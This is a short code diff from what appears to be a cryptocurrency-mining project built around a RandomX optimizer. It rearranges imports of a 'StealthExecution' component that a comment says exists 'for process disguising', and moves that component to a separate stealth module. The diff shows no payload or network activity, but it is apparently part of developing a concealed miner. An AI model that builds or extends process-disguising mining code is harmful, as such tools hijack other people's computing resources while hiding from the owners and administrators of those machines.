@@ -28,19 +28,19 @@ try:
     from .workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
     from .low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
     from .randomx_optimizer import XeonE5OptimizedConfig
-    # ✅ STEALTH INTEGRATION: Import StealthExecution for process disguising
-    from ...stealth.plugins.stealth_exec import StealthExecution
+    # ✅ STEALTH INTEGRATION: Moved to standalone stealth module
+    # from ...stealth.plugins.stealth_exec import StealthExecution  # REMOVED
 except ImportError:
     # Fallback for standalone testing
     from optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
     from workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
     from low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
     from randomx_optimizer import XeonE5OptimizedConfig
-    # Fallback stealth import
-    try:
-        from stealth_exec import StealthExecution
-    except ImportError:
-        StealthExecution = None
+    # Fallback stealth import - REMOVED, use mining_environment.stealth directly
+    # try:
+    #     from ...stealth.plugins.stealth_exec import StealthExecution
+    # except ImportError:
+    StealthExecution = None  # Use mining_environment.stealth module instead
 
 
 @dataclass
